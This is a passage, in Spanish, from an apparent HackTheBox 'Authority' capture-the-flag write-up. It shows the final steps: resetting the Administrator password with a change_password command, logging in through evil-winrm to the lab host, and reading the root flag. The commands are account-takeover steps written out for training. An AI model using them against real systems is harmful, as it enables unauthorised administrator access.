Para cambiar el password del usuario administrator realizamos lo siguiente:
```
change_password Administrator passdeSuperAdmin123.
```
> Donde: passdeSuperAdmin123. es el nuevo password.
{: .prompt-info }
![Desktop View](/writeup-htb-authority/change password.png)
_Change password_
Cambiada la contraseña, procedemos a conectarse con el usuario administrator.
```bash
evil-winrm -i 10.10.11.222 -u 'administrator' -p 'passdeSuperAdmin123.'
```
Esperamos un rato, y ya estamos logueados como administrator.
![Desktop View](/writeup-htb-authority/login administrator.png)
_Login with administrator_
Nos dirigimos al escritorio y obtenemos el flag `root.txt`.
![Desktop View](/writeup-htb-authority/root flag.png)
_Flag del root_
> Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
`¡Happy Hacking!` `¡You can be root!`


